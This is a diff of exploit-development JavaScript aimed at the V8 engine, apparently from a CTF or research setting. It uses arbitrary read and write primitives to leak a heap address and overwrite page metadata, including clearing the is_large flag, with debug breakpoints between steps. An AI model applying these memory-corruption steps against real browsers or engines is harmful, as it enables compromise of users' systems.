@@ -34,20 +34,35 @@ let u8arr = new Uint8Array(buf);
 // heap_base
 let ofs1 = 0x48;
 let leak_addr = v8_read64(ofs1);
-let ofs2 = leak_addr & 0xffffffffn;
-let ofs3 = leak_addr & 0xffffffff00000000n;
-let leak_addr2 = ofs3 + 0x48n;
-console.log("addr[0x" + ofs1.toString(16) + "] = 0x" + leak_addr.toString(16));
-console.log("ofs2: ", ofs2.toString(16));
-console.log("ofs2 value: ", v8_read64(ofs2).toString(16));
+let low_ofs_started_page = leak_addr & 0xffffffffn;
+let high_ofs_started_page = leak_addr & 0xffffffff00000000n;
+let ofs_store_page_metadata_pointer = high_ofs_started_page + 0x48n;
+console.log("addr[0x" + ofs_store_page_metadata_pointer.toString(16) + "] = 0x" + leak_addr.toString(16));
+console.log("low_ofs_started_page = " + low_ofs_started_page.toString(16));
+console.log("[low_ofs_started_page]: = " + v8_read64(low_ofs_started_page).toString(16));
 console.log("before writing to addr: 0x"+ leak_addr.toString(16));
 // 0x35b200000048
 
-// %SystemBreak();
+gc();
+gc();
+gc();
+%SystemBreak();
 
-v8_write64(ofs2, 0x4141414142424242n);
+v8_write64(low_ofs_started_page+0x40n, 0x0101010102020202n);
+console.log("after writing +0x40");
+v8_write64(low_ofs_started_page+0x30n, 0x0303030304040404n);
+console.log("after writing +0x30");
+v8_write64(low_ofs_started_page+0x20n, 0x0505050506060606n);
+console.log("after writing +0x20");
+v8_write64(low_ofs_started_page+0x10n, 0x0707070708080808n);
+console.log("after writing +0x10");
+
+v8_write64(low_ofs_started_page, 0x4141414142020000n); // disable flag is_large (0x200)
+console.log("after writing +0x0");
 console.log("after writing to addr: 0x"+ leak_addr.toString(16));
-// %SystemBreak();
+
+
+%SystemBreak();
 // Write to the page starting at 0x3c032d4c0000 
 // addr[ 48 ] =  291e00040000
 
